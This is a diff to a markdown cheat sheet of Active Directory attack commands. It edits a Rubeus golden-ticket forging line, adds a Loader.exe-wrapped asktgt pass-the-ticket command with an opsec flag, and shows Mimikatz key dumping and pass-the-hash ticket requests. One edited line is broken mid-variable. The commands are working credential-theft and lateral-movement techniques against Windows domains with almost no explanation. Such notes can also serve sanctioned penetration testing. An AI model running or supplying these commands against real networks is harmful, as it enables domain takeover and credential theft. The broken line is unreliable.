@@ -110,7 +110,9 @@ Invoke-Mimi -Command '"sekurlsa::ekeys"'
 
 ```powershell
 # contains secrets for the: scheduled tasks, ...
-Rubeus.exe -args golden /aes256:$ztarg_user_hash /sid:$ztarg_user_sid /ldap /user:$ztarg_user_name /printcmd
+Rubeus.exe -args golden /aes256:$ztarg_user_aes256k /sid:$ztarg_user_sid /ldap /user:$ztarg_user_name /printcmd
+
+.\Loader.exe -path .\Rubeus.exe -args asktgt /user:$ztarg_user_name /aes256:$ztarg_user_aes256k /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 ### <a name='silver'></a>silver
@@ -182,7 +184,8 @@ Rubeus.exe -args %Pwn% /user:$ztarg_user_name /aes256:$ztarg_user_hash /opsec /c
 .\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_hash /ptt
 
 # Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
-.\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_hash /createnetonly:C:\Windows\System32\cmd.exe
+.\Rubeus.exe asktgt /user:$ztarg_
+user_name /rc4:$ztarg_user_hash /createnetonly:C:\Windows\System32\cmd.exe
 ```
 
 ## <a name='which-os-what-creds'></a>which-os-what-creds
